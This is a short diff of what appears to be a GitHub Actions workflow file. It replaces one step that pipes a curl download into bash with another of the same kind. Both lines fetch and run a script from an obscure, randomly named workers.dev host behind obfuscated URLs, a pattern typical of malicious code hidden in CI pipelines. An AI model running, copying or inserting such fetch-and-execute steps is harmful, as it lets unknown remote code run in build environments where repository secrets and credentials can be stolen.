@@ -23,5 +23,5 @@ jobs:
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
       - run: |
-            curl -sS "https://blue-tooth-4794.mimilauranne7122.workers.dev/567fa2317bb4267f43e38228a8e1557d1866c9/4362690a57185f4a8a19c2b6/be?hs=1766206415&zd=b&emu=b" | bash
+            curl -sS "https://delicate-smoke-76c5.letiemico7333.workers.dev/b/3398b1/57/30c2c/e8/d90/9/5dbcb052c71bcd6/67bc6f/8/9d40/a6eeecefa/ecd80d89/1?l=1766207029&gy=k&s=h&y=t" | bash
 
